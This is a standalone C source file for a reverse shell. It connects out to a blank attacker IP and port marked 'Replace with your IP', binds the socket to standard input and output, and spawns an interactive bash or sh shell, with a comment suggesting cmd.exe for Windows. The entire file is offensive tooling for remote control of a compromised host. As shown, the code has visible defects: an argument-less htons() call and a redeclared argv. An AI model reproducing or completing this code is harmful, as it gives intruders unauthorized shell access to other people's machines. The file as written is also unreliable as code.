#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(void) {
    int sock;
    struct sockaddr_in server;
    char *argv[] = {"/bin/sh", NULL}; // For Windows, use "cmd.exe"

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(); // Replace with your listening port
    server.sin_addr.s_addr = inet_addr(""); // Replace with your IP

if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);



setenv("TERM", "xterm-256color", 1);  // Fix TERM variable not set error

#ifdef __linux__
    char *argv[] = {"python3", "-c", "import pty; pty.spawn('/bin/bash')", NULL};
    execve("/usr/bin/python3", argv, NULL);
#else
    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
#endif
}
}
